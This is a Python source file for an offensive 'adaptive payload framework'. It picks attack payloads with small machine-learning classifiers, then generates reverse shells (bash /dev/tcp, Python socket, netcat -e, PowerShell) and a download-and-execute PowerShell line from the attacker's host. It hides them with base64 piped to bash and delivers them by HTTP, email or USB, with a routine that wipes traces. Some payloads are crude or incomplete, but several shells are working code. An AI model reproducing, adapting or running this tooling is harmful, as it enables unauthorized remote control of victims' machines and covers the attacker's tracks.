import os
import socket
import subprocess
import base64
import requests
import random
import time
import smtplib
from email.message import EmailMessage
import json
import numpy as np
from sklearn.tree import DecisionTreeClassifier
from sklearn.neural_network import MLPClassifier


class AdaptivePayloadFramework:
    def __init__(self):
        self.target_ip = None
        self.target_os = None
        self.lhost = None
        self.lport = None
        self.email_config = self.load_email_config()
        self.decision_tree_model = self._train_decision_tree()
        self.neural_network_model = self._train_neural_network()

    # =============================
    # Email Configuration
    # =============================
    def setup_email_config(self):
        """
        Interactive setup for email delivery configuration.
        """
        print("\nSet up your email delivery configuration:")
        smtp_server = input("Enter your SMTP server (e.g., smtp.gmail.com): ").strip()
        smtp_port = input("Enter your SMTP port (e.g., 587): ").strip()
        sender_email = input("Enter your email address: ").strip()
        sender_password = input("Enter your email password: ").strip()

        # Save configuration to a file
        self.email_config = {
            "smtp_server": smtp_server,
            "smtp_port": smtp_port,
            "sender_email": sender_email,
            "sender_password": sender_password,
        }
        with open(".email_config.json", "w") as config_file:
            json.dump(self.email_config, config_file)
        print("Email configuration saved successfully!")

    def load_email_config(self):
        """
        Load email configuration from a file or prompt for setup.
        """
        if os.path.exists(".email_config.json"):
            with open(".email_config.json", "r") as config_file:
                print("Email configuration loaded from file.")
                return json.load(config_file)
        else:
            print("No email configuration found. Starting setup.")
            self.setup_email_config()
            return self.email_config

    # =============================
    # Step 1: Train Decision Tree
    # =============================
    def _train_decision_tree(self):
        """
        Trains a Decision Tree Classifier for payload recommendations.
        """
        X = [
            [0, 1, 1, 0],  # Windows, Open ports, Firewall, x86
            [0, 1, 1, 1],  # Windows, Open ports, Firewall, x64
            [1, 1, 0, 1],  # Linux, Open ports, No defenses, x64
            [2, 0, 1, 1],  # macOS, No open ports, Firewall, x64
            [1, 1, 1, 1],  # Linux, Open ports, Firewall, x64
            [1, 0, 0, 1],  # Linux, No open ports, No defenses, x64
            [2, 1, 1, 0],  # macOS, Open ports, Firewall, x86
            [3, 1, 0, 1],  # IoT, Open ports, No defenses, x64
            [4, 1, 1, 1],  # Cloud, Open ports, Firewall, x64
        ]
        y = [
            "powershell_reverse",
            "fileless_powershell",
            "bash_reverse",
            "python_reverse",
            "dns_tunneling",
            "iot_worm",
            "steganographic",
            "iot_specific",
            "cloud_payload",
        ]
        model = DecisionTreeClassifier()
        model.fit(X, y)
        return model

    # =============================
    # Step 2: Train Neural Network
    # =============================
    def _train_neural_network(self):
        """
        Trains a simple Neural Network for fallback payload recommendations.
        """
        X = np.array([
            [0, 1, 1, 0],
            [0, 1, 1, 1],
            [1, 1, 0, 1],
            [2, 0, 1, 1],
            [1, 1, 1, 1],
            [1, 0, 0, 1],
            [2, 1, 1, 0],
            [3, 1, 0, 1],
            [4, 1, 1, 1],
        ])
        y = np.array([
            0, 1, 2, 3, 4, 5, 6, 7, 8
        ])
        model = MLPClassifier(hidden_layer_sizes=(10, 10), max_iter=500)
        model.fit(X, y)
        return model

    # =============================
    # Step 3: Predict Payload Type
    # =============================
    def _predict_payload_type(self, os_type, open_ports, defenses, arch):
        """
        Predicts the best payload type based on reconnaissance data.
        """
        features = np.array([[os_type, open_ports, defenses, arch]])
        try:
            prediction = self.decision_tree_model.predict(features)[0]
        except Exception:
            prediction = self.neural_network_model.predict(features)[0]
            prediction = [
                "powershell_reverse",
                "fileless_powershell",
                "bash_reverse",
                "python_reverse",
                "dns_tunneling",
                "iot_worm",
                "steganographic",
                "iot_specific",
                "cloud_payload",
            ][prediction]
        return prediction

    # =============================
    # Step 4: Generate Payload
    # =============================
    def generate_payload(self, payload_type):
        """
        Generate a payload based on the recommended type.
        """
        if not self.lhost or not self.lport:
            print("LHOST and LPORT must be set!")
            return None

        payload = None
        if payload_type == "powershell_reverse":
            payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});"
        elif payload_type == "fileless_powershell":
            payload = f"IEX(New-Object Net.WebClient).DownloadString('http://{self.lhost}/fileless.ps1');"
        elif payload_type == "bash_reverse":
            payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        elif payload_type == "python_reverse":
            payload = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash']);"
        elif payload_type == "dns_tunneling":
            payload = f"import dns.resolver;data='Sensitive_Data';domain=f'{data}.{self.lhost}';dns.resolver.resolve(domain, 'A');"
        elif payload_type == "iot_worm":
            payload = f"telnet {self.target_ip} -e /bin/sh"
        elif payload_type == "steganographic":
            payload = f"echo 'Hidden Data' > /tmp/cover_image.jpg && exiftool -Comment='Hidden Data' /tmp/cover_image.jpg"
        elif payload_type == "iot_specific":
            payload = f"nc {self.target_ip} {self.lport} -e /bin/sh"
        elif payload_type == "cloud_payload":
            payload = f"curl -X POST -d 'payload' http://{self.lhost}:{self.lport}/api/execute"
        print(f"Generated payload: {payload}")
        return payload

    # =============================
    # Step 5: Mutate Payload
    # =============================
    def mutate_payload(self, payload):
        """
        Obfuscates the payload using multiple techniques.
        """
        print("Mutating payload...")
        encoded_payload = base64.b64encode(payload.encode()).decode()
        mutated_payload = f"echo {encoded_payload} | base64 -d | bash"
        print(f"Mutated payload: {mutated_payload}")
        return mutated_payload

    # =============================
    # Step 6: Deliver Payload
    # =============================
    def deliver_payload(self, payload):
        """
        Deliver the payload using the chosen delivery method.
        """
        print("\nChoose Delivery Method:")
        print("1. HTTP (Default)")
        print("2. Manual Download")
        print("3. Email Delivery")
        print("4. USB Drop")
        delivery_option = input("Enter the delivery method (1-4): ").strip()

        if delivery_option == "1" or delivery_option == "":
            print("Delivering payload via HTTP...")
            try:
                requests.post(f"http://{self.target_ip}:8080", data={"payload": payload})
                print("Payload delivered successfully via HTTP.")
            except Exception as e:
                print(f"Failed to deliver payload via HTTP: {e}")

        elif delivery_option == "2":
            print("Preparing payload for manual download...")
            try:
                file_path = f"./payloads/manual_payload_{int(time.time())}.sh"
                with open(file_path, "w") as file:
                    file.write(payload)
                print(f"Payload saved for manual download: {file_path}")
            except Exception as e:
                print(f"Failed to prepare payload for manual download: {e}")

        elif delivery_option == "3":
            print("Sending payload via Email...")
            try:
                email = input("Enter the recipient's email address: ").strip()
                msg = EmailMessage()
                msg['Subject'] = "Payload Delivery"
                msg['From'] = self.email_config['sender_email']
                msg['To'] = email
                msg.set_content(f"The payload is attached.\n\nPayload:\n{payload}")

                server = smtplib.SMTP(self.email_config['smtp_server'], int(self.email_config['smtp_port']))
                server.starttls()
                server.login(self.email_config['sender_email'], self.email_config['sender_password'])
                server.send_message(msg)
                server.quit()
                print("Payload sent successfully via Email.")
            except Exception as e:
                print(f"Failed to send payload via Email: {e}")

        elif delivery_option == "4":
            print("Saving payload to USB directory...")
            try:
                usb_path = "/media/usb/"  # Example USB mount point
                file_path = os.path.join(usb_path, f"usb_payload_{int(time.time())}.sh")
                with open(file_path, "w") as file:
                    file.write(payload)
                print(f"Payload saved to USB directory: {file_path}")
            except Exception as e:
                print(f"Failed to save payload to USB directory: {e}")

        else:
            print("Invalid option. Defaulting to HTTP delivery...")
            try:
                requests.post(f"http://{self.target_ip}:8080", data={"payload": payload})
                print("Payload delivered successfully via HTTP.")
            except Exception as e:
                print(f"Failed to deliver payload via HTTP: {e}")

    # =============================
    # Step 7: Self-Destruct (Optional)
    # =============================
    def self_destruct(self):
        """
        Optional self-destruct mechanism to remove traces of the payload and any temporary files.
        """
        prompt = input("Do you want to enable the self-destruct feature? (yes/no): ").strip().lower()
        if prompt not in ["yes", "y"]:
            print("Self-destruct skipped.")
            return

        print("Triggering self-destruct mechanism...")
        
        # Paths to clean up
        paths_to_remove = [
            f"./payloads/manual_payload_{int(time.time())}.sh",  # Example payload file
            "./.email_config.json",  # Email configuration file (if necessary)
            "/media/usb/"  # USB directory (if used for payload delivery)
        ]

        try:
            # Remove specified files
            for path in paths_to_remove:
                if os.path.exists(path):
                    os.remove(path)
                    print(f"Removed: {path}")
            
            # Optionally remove leftover directories (e.g., USB directories)
            usb_path = "/media/usb/"
            if os.path.exists(usb_path) and os.path.isdir(usb_path):
                os.rmdir(usb_path)  # Remove directory if empty
                print(f"Removed USB directory: {usb_path}")

            print("All traces removed successfully.")
        except Exception as e:
            print(f"Error during self-destruct: {e}")
        
        print("Payload self-destructed.")

    # =============================
    # Step 8: Execute Framework
    # =============================
    def execute(self):
        """
        High-level execution of the framework.
        """
        if not self.target_ip:
            print("Target IP is not set!")
            return

        payload_type = self._predict_payload_type(0, 1, 1, 1)  # Example inputs
        payload = self.generate_payload(payload_type)
        if not payload:
            return

        mutated_payload = self.mutate_payload(payload)
        print(f"Final Payload: {mutated_payload}")
        self.deliver_payload(mutated_payload)
        self.self_destruct()
